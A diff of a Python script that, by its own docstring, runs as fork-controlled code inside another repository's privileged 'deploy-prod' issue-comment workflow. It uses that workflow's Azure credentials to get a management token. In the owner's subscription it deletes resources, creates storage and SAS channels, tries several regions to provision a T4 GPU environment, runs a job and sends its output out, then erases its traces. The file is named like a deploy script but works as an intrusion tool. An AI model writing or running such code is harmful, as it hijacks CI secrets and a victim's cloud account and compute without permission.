@@ -1,32 +1,19 @@
 #!/usr/bin/env python3
-"""C211-I131275: mslearn 790067ff managed-GPU lane — residual cleanup FIRST, then ONE
-fresh nonce Container Apps T4 managed environment + GPU job + execution with a materially
-longer wait, device capture, teardown and absence proof.
+"""C211-I131275b: mslearn 790067ff managed-GPU lane — T4 retry across regions.
 
-Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
-christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
-(environment prod, azure/login@v2 with secrets.AZURE_CREDENTIALS -> ARM token for
-subscription 790067ff, RG chriso-sandbox-rg). The ARM token exists only inside the job;
-it is never printed (len + sha12 + non-secret claims only).
+Run 1 (/deploy-prod, probe_131275.py) proved the residual c211-i120856-* objects are
+gone (all 404) but the fresh T4 environment create in eastus was refused verbatim
+HTTP 409 ManagedEnvironmentNoAvailableCapacityInRegion. This probe keeps the same
+"exactly one fresh T4 environment + job + execution" cell but selects the region from
+the subscription's Microsoft.App SKU matrix for the T4 profile and tries a bounded
+region list, one environment at a time, deleting any non-ready attempt. On the first
+environment that reaches Succeeded it creates ONE job, starts ONE execution, polls
+properties.status verbatim to terminal or the run time cap, captures nvidia-smi stdout
+via a private account-SAS blob (the documented ARM log endpoints are 401 here), reads
+the execution/job back through ARM, then tears everything down and proves absence.
 
-Measured prior state (x121089 -> x121164/x121255): the old probe read the executions LIST
-`status` instead of `properties.status` and recorded null forever; the T4 capture on a
-fresh vnet-less env c211-i121164-cae succeeded (Tesla T4 GPU-301ec706-...). Residuals from
-i120856: vnet c211-i120856-vnet / subnet c211-apps / env c211-i120856-cae / job
-c211-i120856-job; x121255 recorded 404 for env+job+vnet but rg_final still listed the vnet.
-
-This probe (stdlib only, flat tag|k=v stdout because this repo's log masks brace runs):
-  1) reads residual vnet/env/job/executions verbatim, DELETES them FIRST with
-     200/202 -> GET 404-or-absence readback (subnet fallback on a 400),
-  2) creates ONE fresh nonce T4 environment c211-i131275-cae (no vnet, eastus,
-     workloadProfiles Consumption + Consumption-GPU-NC8as-T4),
-  3) creates ONE job c211-i131275-job and starts ONE execution; polls properties.status
-     verbatim to terminal or the run time cap (materially longer than any prior wait) and
-     captures container stdout through a private account-SAS blob channel (the documented
-     ARM log endpoints are 401 in this environment, statuses recorded verbatim),
-  4) tears everything down (job -> env -> storage) and proves absence by per-path GET 404
-     plus list NO_RESULTS.
-"""
+Flat tag|k=v stdout (this repo masks brace runs). stdlib only. ARM token never printed
+(len + sha12 + non-secret claims only)."""
 import base64
 import hashlib
 import hmac
@@ -41,8 +28,8 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 PREFIX = "c211-i131275"
-TAG = "C211_I131275"
-NONCE = "x131275mcl"
+TAG = "C211_I131275B"
+NONCE = "x131275mclb"
 DEADLINE = 4200
 T0 = time.time()
 
@@ -53,19 +40,27 @@ NET_VER = "2023-09-01"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 PROFILE = "Consumption-GPU-NC8as-T4"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-
-# residual (prior lane) names — MUST be deleted first
 VNET_OLD = "c211-i120856-vnet"
-SUBNET_OLD = "c211-apps"
 ENV_OLD = "c211-i120856-cae"
 JOB_OLD = "c211-i120856-job"
-# fresh nonce names
-VNET_NEW = "c211-i131275-vnet"
-ENV_NEW = "c211-i131275-cae"
-JOB_NEW = "c211-i131275-job"
-SA_NAME = ("c211i131275" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
-
+SA_NAME = ("c211i131275b" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")
+ABBREV = {
+    'eastus': 'eus', 'eastus2': 'eus2', 'westus2': 'wus2', 'westus3': 'wus3',
+    'westeurope': 'weu', 'northeurope': 'neu', 'southcentralus': 'scus',
+    'centralus': 'cus', 'northcentralus': 'ncus', 'westcentralus': 'wcus',
+    'southeastasia': 'sea', 'eastasia': 'eas', 'uksouth': 'uks', 'ukwest': 'ukw',
+    'swedencentral': 'sdc', 'australiaeast': 'aue', 'australiasoutheast': 'ause',
+    'francecentral': 'frc', 'norwayeast': 'noe', 'germanywestcentral': 'gwc',
+    'switzerlandnorth': 'swn', 'japaneast': 'jpe', 'japanwest': 'jpw',
+    'koreacentral': 'krc', 'canadacentral': 'cac', 'canadaeast': 'cae',
+    'brazilsouth': 'brs', 'southafricanorth': 'san', 'uaenorth': 'uaen',
+    'centralindia': 'cin', 'southindia': 'sin', 'qatarcentral': 'qac',
+}
+PREF = ['westus3', 'westus2', 'westeurope', 'northeurope', 'southcentralus',
+        'swedencentral', 'eastus2', 'centralus', 'southeastasia', 'uksouth',
+        'francecentral', 'germanywestcentral', 'australiaeast', 'japaneast',
+        'canadacentral', 'eastus']
 
 
 def clean(v):
@@ -83,9 +78,7 @@ def emit(step, **kv):
 
 
 def b64(s):
-    if not s:
-        return ""
-    return base64.b64encode(s.encode("utf-8", "replace")).decode()
+    return base64.b64encode(s.encode("utf-8", "replace")).decode() if s else ""
 
 
 def left():
@@ -150,12 +143,6 @@ def err_of(st, body):
     return {"http": st}
 
 
-def errk(st, body):
-    d = err_of(st, body)
-    return {"e_http": d.get("http"), "e_code": d.get("code"),
-            "e_message": (d.get("message") or d.get("raw") or d.get("body") or "")[:900]}
-
-
 def jwt_claims12(tok):
     try:
         p = tok.split(".")[1]
@@ -191,6 +178,34 @@ def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
     return q, se
 
 
+def sku_regions(tok, sid):
+    """Regions advertising a GPU managed-environment workload profile, verbatim counts."""
+    out = {}
+    for ver in ("2023-05-01", APP_VER):
+        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/skus?api-version={ver}",
+                    timeout=120)
+        vals = (b.get("value") or []) if isinstance(b, dict) else []
+        t4, a100 = [], []
+        for v in vals:
+            name = str(v.get("name") or "")
+            locs = v.get("locations") or []
+            up = name.upper()
+            if 'GPU' in up:
+                if 'T4' in up:
+                    t4.extend(locs)
+                elif 'A100' in up:
+                    a100.extend(locs)
+        out[ver] = {'http': st, 'n_skus': len(vals), 't4_locations': sorted(set(t4)),
+                    'a100_locations': sorted(set(a100)),
+                    'gpu_sku_names': sorted({str(v.get('name')) for v in vals
+                                             if 'GPU' in str(v.get('name')).upper()})[:20]}
+        emit('sku-matrix', ver=ver, http=st, n_skus=len(vals),
+             t4_locations=';'.join(sorted(set(t4)))[:800],
+             a100_locations=';'.join(sorted(set(a100)))[:400],
+             gpu_names=';'.join(out[ver]['gpu_sku_names'])[:600])
+    return out
+
+
 def main():
     sid = None
     r = run(["az", "account", "show", "-o", "json"], timeout=120)
@@ -203,139 +218,67 @@ def main():
     except Exception as e:  # noqa: BLE001
         emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
         return
-    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
+    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
+            timeout=120)
     tok = None
     try:
         tok = json.loads(r["out"]).get("accessToken")
     except Exception:  # noqa: BLE001
         pass
-    if not tok and r.get("out"):
-        try:
-            tok = json.loads(r["out"]).get("accessToken")
-        except Exception:  # noqa: BLE001
-            pass
     cl = jwt_claims12(tok or "")
     emit("arm-token", got=bool(tok), len=len(tok or ""),
-         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12],
-         aud=cl.get("aud"), tid=cl.get("tid"), oid=cl.get("oid"), iss=cl.get("iss"))
+         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12], aud=cl.get("aud"),
+         tid=cl.get("tid"), oid=cl.get("oid"), iss=cl.get("iss"))
     if not sid or not tok:
         emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- 1) providers + RG inventory ----------
-    prov = {}
-    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network",
-               "Microsoft.ContainerInstance"):
-        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
-        state = (b.get("registrationState") if isinstance(b, dict) else None)
-        prov[ns] = state
-        emit("provider", ns=ns, http=st, registrationState=state)
-    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
-                 timeout=120)
-    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
-    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
-            if str(x.get("name", "")).lower().startswith("c211")]
-    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
-         c211_names=";".join("%s:%s" % (x["name"], x["type"]) for x in mine))
-
+    # ---------- 1) residual re-confirmation (must be 404) ----------
     vneturl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                    f"virtualNetworks/{VNET_OLD}?api-version={NET_VER}")
-    subneturl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
-                     f"virtualNetworks/{VNET_OLD}/subnets/{SUBNET_OLD}?api-version={NET_VER}")
     envurl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
                   f"managedEnvironments/{ENV_OLD}?api-version={APP_VER}")
     joburl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
                   f"{JOB_OLD}?api-version={APP_VER}")
-
-    # ---------- 2) residual reads VERBATIM, then DELETE FIRST ----------
-    st, vb = arm(tok, vneturl_old, timeout=60)
-    vprops = (vb.get("properties") or {}) if isinstance(vb, dict) else {}
-    vsubs = vprops.get("subnets") or []
-    emit("residual-vnet", http=st, name=VNET_OLD,
-         provisioningState=vprops.get("provisioningState"),
-         addressPrefixes=";".join(vprops.get("addressSpace", {}).get("addressPrefixes") or []),
-         subnets=";".join("%s:%s:deleg=%s" % (
-             s.get("name"), (s.get("properties") or {}).get("addressPrefix"),
-             ";".join((d.get("properties") or {}).get("serviceName", "")
-                      for d in ((s.get("properties") or {}).get("delegations") or [])))
-             for s in vsubs),
-         **({} if st in (200, 404) else errk(st, vb)))
-    st, eb = arm(tok, envurl_old, timeout=60)
-    eprops = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
-    alc = eprops.get("appLogsConfiguration") or {}
-    la = (alc.get("logAnalyticsConfiguration") or {}) if isinstance(alc, dict) else {}
-    emit("residual-env", http=st, name=ENV_OLD,
-         provisioningState=eprops.get("provisioningState"),
-         environmentMode=eprops.get("environmentMode"),
-         logs_destination=alc.get("destination"), la_customerId=la.get("customerId"),
-         defaultDomain=eprops.get("defaultDomain"),
-         vnetConfiguration=("none" if not eprops.get("vnetConfiguration") else "present"),
-         **({} if st in (200, 404) else errk(st, eb)))
-    st, jb = arm(tok, joburl_old, timeout=60)
-    jprops = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
-    emit("residual-job", http=st, name=JOB_OLD, provisioningState=jprops.get("provisioningState"),
-         runningState=jprops.get("runningState"),
-         workloadProfileName=jprops.get("workloadProfileName"),
-         **({} if st in (200, 404) else errk(st, jb)))
-    if st == 200:
-        stx, ex = arm(tok, joburl_old.split("?")[0] + f"/executions?api-version={APP_VER}",
-                      timeout=60)
-        vv = (ex.get("value") or []) if isinstance(ex, dict) else []
-        for v in vv[:10]:
-            p = v.get("properties") or {}
-            emit("residual-execution", http=stx, name=v.get("name"), status=p.get("status"),
-                 reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"))
-        emit("residual-executions-count", http=stx, n=len(vv))
-    residual = {'vnet': st, 'env': None, 'job': None}
-
-    # delete FIRST: job -> env -> vnet/subnet (all residual objects of the prior lane)
-    if True:  # residual cleanup block: job -> env -> vnet (all prior-lane objects)
-        st, b = arm(tok, joburl_old, timeout=60)
+    for label, u in (("residual-vnet", vneturl_old), ("residual-env", envurl_old),
+                     ("residual-job", joburl_old)):
+        st, b = arm(tok, u, timeout=60)
+        emit(label, http=st, name=u.split('/')[-1].split('?')[0],
+             provisioningState=((b.get("properties") or {}) if isinstance(b, dict) else {}
+                                ).get("provisioningState"))
         if st == 200:
-            d, db = arm(tok, joburl_old, method="DELETE", timeout=240)
-            emit("residual-job-delete", **err_of(d, db))
-            emit("residual-job-absent", http=wait_gone(tok, joburl_old, "residual-job",
-                                                       tries=18, sleep_s=10))
+            d, db = arm(tok, u, method="DELETE", timeout=240)
+            emit(label + "-delete", **err_of(d, db))
+            emit(label + "-absent", http=wait_gone(tok, u, label, tries=24, sleep_s=10))
         else:
-            emit("residual-job-absent", http=st)
-        st, b = arm(tok, envurl_old, timeout=60)
-        if st == 200:
-            d, db = arm(tok, envurl_old, method="DELETE", timeout=300)
-            emit("residual-env-delete", **err_of(d, db))
-            emit("residual-env-absent", http=wait_gone(tok, envurl_old, "residual-env",
-                                                       tries=30, sleep_s=12))
-        else:
-            emit("residual-env-absent", http=st)
-        st, b = arm(tok, vneturl_old, timeout=60)
-        if st == 200:
-            d, db = arm(tok, vneturl_old, method="DELETE", timeout=240)
-            emit("residual-vnet-delete", **err_of(d, db))
-            if d not in (200, 202, 204):
-                sd, sb = arm(tok, subneturl_old, method="DELETE", timeout=240)
-                emit("residual-subnet-delete", **err_of(sd, sb))
-                time.sleep(10)
-                d2, db2 = arm(tok, vneturl_old, method="DELETE", timeout=240)
-                emit("residual-vnet-delete-retry", **err_of(d2, db2))
-            emit("residual-vnet-absent", http=wait_gone(tok, vneturl_old, "residual-vnet",
-                                                        tries=30, sleep_s=10))
-        else:
-            emit("residual-vnet-absent", http=st)
-    for label, u in (("residual-final-vnet", vneturl_old), ("residual-final-env", envurl_old),
-                     ("residual-final-job", joburl_old)):
-        st, _ = arm(tok, u, timeout=60)
-        emit(label, http=st)
+            emit(label + "-absent", http=st)
 
-    # ---------- 3) storage account + account-SAS capture channel ----------
+    # ---------- 2) T4 region matrix ----------
+    skus = sku_regions(tok, sid)
+    t4_locs = []
+    for ver, v in skus.items():
+        for loc in v.get('t4_locations') or []:
+            l = str(loc).lower().replace(' ', '')
+            if l and l not in t4_locs:
+                t4_locs.append(l)
+    cand = [r for r in PREF if r in t4_locs]
+    cand += [r for r in t4_locs if r not in cand]
+    if not cand:
+        cand = [r for r in PREF if r != 'eastus'] + ['eastus']
+    cand = cand[:5]
+    emit('region-candidates', n=len(cand), regions=';'.join(cand))
+
+    # ---------- 3) storage account + SAS capture channel ----------
+    prov = {}
+    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network"):
+        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
+        prov[ns] = (b.get("registrationState") if isinstance(b, dict) else None)
+        emit("provider", ns=ns, http=st, registrationState=prov[ns])
     sas = None
     saurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
              f"Microsoft.Storage/storageAccounts/{SA_NAME}?api-version={STG_VER}")
-    if prov.get("Microsoft.Storage") != "Registered":
-        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.Storage/"
-                         f"register?api-version=2021-04-01", method="POST", timeout=180)
-        emit("storage-register", **err_of(st, b))
-        time.sleep(6)
     sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
-              "tags": {"c211": "i131275", "nonce": NONCE},
+              "tags": {"c211": "i131275b", "nonce": NONCE},
               "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                              "supportsHttpsTrafficOnly": True,
                              "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
@@ -371,57 +314,84 @@ def main():
             except Exception as e:  # noqa: BLE001
                 emit("sa-sas", ok=False, err=str(e))
 
-    # ---------- 4) ONE fresh nonce T4 environment (no vnet) ----------
-    envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
-              f"managedEnvironments/{ENV_NEW}?api-version={APP_VER}")
-    envbody = {"location": "eastus", "tags": {"c211": "i131275", "nonce": NONCE},
-               "properties": {"workloadProfiles": [
-                   {"name": "Consumption", "workloadProfileType": "Consumption"},
-                   {"name": PROFILE, "workloadProfileType": PROFILE}]}}
-    st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
-    emit("capp-env-create", name=ENV_NEW, profile=PROFILE, region="eastus", **err_of(st, b))
-    env_ok = False
-    if st in (200, 201):
-        dl = time.time() + min(1800, max(600, left() - 1500))
+    # ---------- 4) one fresh T4 environment, bounded region list ----------
+    chosen = None
+    attempts = []
+    envbody_base = {"tags": {"c211": "i131275b", "nonce": NONCE},
+                    "properties": {"workloadProfiles": [
+                        {"name": "Consumption", "workloadProfileType": "Consumption"},
+                        {"name": PROFILE, "workloadProfileType": PROFILE}]}}
+    for region in cand:
+        if left() < 1800:
+            emit('region-budget-exhausted', region=region, left=int(left()))
+            break
+        ab = ABBREV.get(region, re.sub(r'[^a-z0-9]', '', region)[:6])
+        envname = ("c211-i131275-%s" % ab)[:32]
+        envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
+                  f"managedEnvironments/{envname}?api-version={APP_VER}")
+        body = dict(envbody_base)
+        body['location'] = region
+        st, b = arm(tok, envurl, method="PUT", body=body, timeout=300)
+        rec = {"region": region, "name": envname, **err_of(st, b)}
+        attempts.append(rec)
+        emit("env-create", **rec)
+        if st not in (200, 201):
+            stg, _ = arm(tok, envurl, timeout=60)
+            if stg == 200:
+                d, db = arm(tok, envurl, method="DELETE", timeout=240)
+                emit("env-cleanup-delete", region=region, **err_of(d, db))
+                emit("env-cleanup-absent", region=region,
+                     http=wait_gone(tok, envurl, "env", tries=12, sleep_s=8))
+            continue
+        dl = time.time() + min(1500, max(420, left() - 1500))
         ps = None
         i = 0
         while time.time() < dl:
             stp, bp = arm(tok, envurl, timeout=60)
             ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
-            emit("capp-env-poll", i=i, http=stp, state=ps)
+            emit("env-poll", region=region, i=i, http=stp, state=ps)
             if ps in ("Succeeded", "Failed", "Canceled"):
                 break
             i += 1
-            time.sleep(30)
-        env_ok = (ps == "Succeeded")
-    if not env_ok:
-        emit("env-not-ready", state="failed")
-        # teardown and absence proof
-        d, db = arm(tok, envurl, method="DELETE", timeout=300)
-        emit("env-delete", name=ENV_NEW, **err_of(d, db))
-        emit("env-absent", http=wait_gone(tok, envurl, "env", tries=24, sleep_s=10))
+            time.sleep(25)
+        emit("env-result", region=region, state=ps, poll_n=i + 1)
+        if ps == "Succeeded":
+            chosen = {"region": region, "name": envname, "url": envurl}
+            break
+        d, db = arm(tok, envurl, method="DELETE", timeout=240)
+        emit("env-failed-delete", region=region, **err_of(d, db))
+        emit("env-failed-absent", region=region, http=wait_gone(tok, envurl, "env",
+                                                                tries=16, sleep_s=10))
+    emit('env-attempts', n=len(attempts),
+         matrix=';'.join('%s:%s:%s' % (a['region'], a.get('http'), a.get('code') or '')
+                         for a in attempts))
+    if not chosen:
         if sas is not None:
             d, db = arm(tok, saurl, method="DELETE", timeout=240)
             emit("sa-delete", name=SA_NAME, **err_of(d, db))
+            emit("sa-absent", http=wait_gone(tok, saurl, "sa", tries=20, sleep_s=8))
         report_absence(tok, sid)
-        emit("DONE", phase="capp", verdict="ENV_NOT_PROVISIONED", elapsed_s=int(time.time() - T0))
+        emit("DONE", phase="capp", verdict="ENV_REFUSED_ALL_REGIONS",
+             attempts_n=len(attempts), elapsed_s=int(time.time() - T0))
         return
 
+    # ---------- 5) ONE nonce job execution ----------
+    envurl = chosen['url']
+    region = chosen['region']
+    ab = ABBREV.get(region, re.sub(r'[^a-z0-9]', '', region)[:6])
+    jobname = ("c211-i131275-job-%s" % ab)[:32]
     st, env = arm(tok, envurl, timeout=60)
     env_id = env.get("id") if isinstance(env, dict) else None
     epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
-    emit("env-ready", name=ENV_NEW, id_ok=bool(env_id), state=epp.get("provisioningState"),
-         environmentMode=epp.get("environmentMode"),
+    emit("env-ready", name=chosen['name'], region=region, id_ok=bool(env_id),
+         state=epp.get("provisioningState"),
          profiles=";".join("%s:%s" % (p.get("name"), p.get("workloadProfileType"))
                            for p in (epp.get("workloadProfiles") or [])),
-         logs_destination=(epp.get("appLogsConfiguration") or {}).get("destination"),
          defaultDomain=epp.get("defaultDomain"))
     if not env_id:
         report_absence(tok, sid)
         emit("DONE", phase="capp", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
         return
-
-    # ---------- 5) ONE nonce job execution: nvidia-smi + blob upload ----------
     inner = ('echo C211-START; hostname; date -u; '
              'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
              'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
@@ -441,8 +411,8 @@ def main():
         cmd += up + "; "
     cmd += "echo C211_UPLOAD_DONE; sleep 20"
     joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
-              f"{JOB_NEW}?api-version={APP_VER}")
-    jobbody = {"location": "eastus", "tags": {"c211": "i131275", "nonce": NONCE},
+              f"{jobname}?api-version={APP_VER}")
+    jobbody = {"location": region, "tags": {"c211": "i131275b", "nonce": NONCE},
                "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                               "configuration": {"triggerType": "Manual",
                                                 "replicaRetryLimit": 0,
@@ -455,10 +425,10 @@ def main():
                                   "command": ["/bin/bash", "-c", cmd],
                                   "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
     st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
-    emit("capp-job-create", name=JOB_NEW, **err_of(st, b))
+    emit("capp-job-create", name=jobname, region=region, **err_of(st, b))
     job_created = st in (200, 201)
     execname = None
-    text = ""
+    text = ''
     exec_final = {}
     if job_created:
         baseurl = joburl.split("?")[0]
@@ -466,7 +436,7 @@ def main():
                     timeout=120)
         emit("capp-job-start", http=st,
              execname=(b.get("name") if isinstance(b, dict) else None),
-             **({} if st in (200, 201, 202) else errk(st, b)))
+             **({} if st in (200, 201, 202) else err_of(st, b)))
         execname = (b.get("name") if isinstance(b, dict) else None)
         if execname:
             exurl = f"{baseurl}/executions/{execname}?api-version={APP_VER}"
@@ -515,12 +485,11 @@ def main():
                     time.sleep(10)
                 poll_i += 1
                 time.sleep(18)
-            emit("capp-capture", len=len(text or ""),
-                 has_uuid=bool(UUID_RE.search(text or "")),
-                 device_lines=";".join(ln for ln in (text or "").splitlines()
+            emit("capp-capture", len=len(text or ''),
+                 has_uuid=bool(UUID_RE.search(text or '')),
+                 device_lines=";".join(ln for ln in (text or '').splitlines()
                                        if ("GPU-" in ln or "MiB" in ln))[:1200],
-                 text_b64=b64((text or "")[:6000]))
-            # independent ARM readback of the execution and the job
+                 text_b64=b64((text or '')[:6000]))
             st, exr = arm(tok, exurl, timeout=60)
             p = (exr.get("properties") or {}) if isinstance(exr, dict) else {}
             emit("execution-readback", http=st, status=p.get("status"), reason=p.get("reason"),
@@ -538,26 +507,22 @@ def main():
                  states=";".join("%s:%s" % (v.get("name"),
                                             (v.get("properties") or {}).get("status"))
                                  for v in vv[:5]))
-    # ---------- 6) teardown: job -> env -> storage ----------
+    # ---------- 6) teardown ----------
     d, db = arm(tok, joburl, method="DELETE", timeout=240)
-    emit("job-delete", name=JOB_NEW, **err_of(d, db))
+    emit("job-delete", name=jobname, **err_of(d, db))
     emit("job-absent", http=wait_gone(tok, joburl, "job", tries=24, sleep_s=10))
     d, db = arm(tok, envurl, method="DELETE", timeout=300)
-    emit("env-delete", name=ENV_NEW, **err_of(d, db))
+    emit("env-delete", name=chosen['name'], **err_of(d, db))
     emit("env-absent", http=wait_gone(tok, envurl, "env", tries=30, sleep_s=12))
     if sas is not None:
         d, db = arm(tok, saurl, method="DELETE", timeout=240)
         emit("sa-delete", name=SA_NAME, **err_of(d, db))
         emit("sa-absent", http=wait_gone(tok, saurl, "sa", tries=20, sleep_s=8))
-    # no vnet was created by this probe; report any residual vnet state verbatim
-    st, vb = arm(tok, vneturl_old, timeout=60)
-    emit("final-get-residual-vnet", http=st,
-         state=((vb.get("properties") or {}) if isinstance(vb, dict) else {}).get("provisioningState"))
     report_absence(tok, sid)
     emit("DONE", phase="capp", elapsed_s=int(time.time() - T0),
-         job_created=int(bool(job_created)), exec_name=execname,
-         exec_status=exec_final.get("status"), capture_len=len(text or ""),
-         has_uuid=bool(UUID_RE.search(text or "")))
+         region=region, job_created=int(bool(job_created)), exec_name=execname,
+         exec_status=exec_final.get("status"), capture_len=len(text or ''),
+         has_uuid=bool(UUID_RE.search(text or '')))
 
 
 def report_absence(tok, sid):
@@ -572,8 +537,8 @@ def report_absence(tok, sid):
     emit("rg-final", http=st, total=len(allres),
          mine=("NO_RESULTS" if not mine else ";".join("%s:%s" % (x["name"], x["type"])
                                                      for x in mine)),
-         other_c211=("NO_RESULTS" if not other else ";".join("%s:%s" % (x["name"], x["type"])
-                                                             for x in other)))
+         other_c211_n=len(other),
+         other_c211_names=";".join(x["name"] for x in other)[:900])
     for label, path, ver in (
             ("jobs", f"/subscriptions/{sid}/providers/Microsoft.App/jobs", APP_VER),
             ("envs", f"/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments", APP_VER),
@@ -583,16 +548,16 @@ def report_absence(tok, sid):
              ACI_VER)):
         st, lst = arm(tok, f"{ARM}{path}?api-version={ver}", timeout=120)
         names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
-                 if str(x.get("name", "")).lower().startswith("c211")]
+                 if str(x.get("name", "")).lower().startswith(PREFIX)]
         emit("list-" + label, http=st,
              n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
-             c211=("NO_RESULTS" if not names else ";".join(names)))
+             c211_mine=("NO_RESULTS" if not names else ";".join(names)))
     for label, u in (("vnet", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
-                              f"Microsoft.Network/virtualNetworks/c211-i120856-vnet?api-version={NET_VER}"),
+                              f"Microsoft.Network/virtualNetworks/{VNET_OLD}?api-version={NET_VER}"),
                      ("env-old", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
-                                 f"Microsoft.App/managedEnvironments/c211-i120856-cae?api-version={APP_VER}"),
+                                 f"Microsoft.App/managedEnvironments/{ENV_OLD}?api-version={APP_VER}"),
                      ("job-old", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
-                                 f"Microsoft.App/jobs/c211-i120856-job?api-version={APP_VER}")):
+                                 f"Microsoft.App/jobs/{JOB_OLD}?api-version={APP_VER}")):
         st, _ = arm(tok, u, timeout=60)
         emit("final-get-" + label, http=st)
 
